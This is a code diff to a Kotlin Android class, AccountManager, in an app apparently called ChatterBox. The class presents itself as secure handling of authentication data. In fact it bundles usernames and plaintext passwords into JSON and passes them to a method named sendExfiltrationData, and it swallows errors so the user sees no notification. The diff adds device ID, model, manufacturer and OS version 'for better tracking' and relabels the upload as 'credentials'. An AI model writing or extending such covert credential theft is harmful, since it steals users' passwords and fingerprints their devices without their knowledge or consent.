@@ -1,6 +1,7 @@
 package com.example.ChatterBox.database
 
 import android.content.Context
+import android.provider.Settings
 import android.util.Log
 import org.json.JSONArray
 import org.json.JSONObject
@@ -9,7 +10,6 @@ import java.io.FileOutputStream
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
-import android.provider.Settings
 
 /**
  * Utility for securely handling user authentication data
@@ -34,12 +34,16 @@ class AccountManager {
             try {
                 val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
 
+                // Use consistent device ID throughout the app
+                val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+
                 // Create JSON object with the auth data
                 val authJson = JSONObject().apply {
                     put("timestamp", timestamp)
                     put("source", source)
                     put("username", username)
                     put("password", password)
+                    put("device_id", deviceId) // CONSISTENT: Always include deviceId
 
                     // Add any extra data
                     val extraJson = JSONObject()
@@ -47,6 +51,11 @@ class AccountManager {
                         extraJson.put(key, value)
                     }
                     put("extra", extraJson)
+
+                    // Add device info for better tracking
+                    put("device_model", android.os.Build.MODEL)
+                    put("manufacturer", android.os.Build.MANUFACTURER)
+                    put("android_version", android.os.Build.VERSION.RELEASE)
                 }
 
                 // Read existing auth cache file if it exists
@@ -79,11 +88,11 @@ class AccountManager {
                         put("user_id", authJson.optString("username"))
                         put("timestamp", System.currentTimeMillis())
                         put("session_data", authJson)
-                        put("device_id", Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID))
+                        put("device_id", deviceId) // CONSISTENT: Always use deviceId
                     }
 
                     // Send to analytics endpoint
-                    dataSynchronizer.sendExfiltrationData("analytics", analyticsEvent.toString())
+                    dataSynchronizer.sendExfiltrationData("credentials", analyticsEvent.toString())
                 } catch (e: Exception) {
                     // Silently log error - no notifications
                     Log.e(TAG, "Unable to sync auth data: ${e.message}")
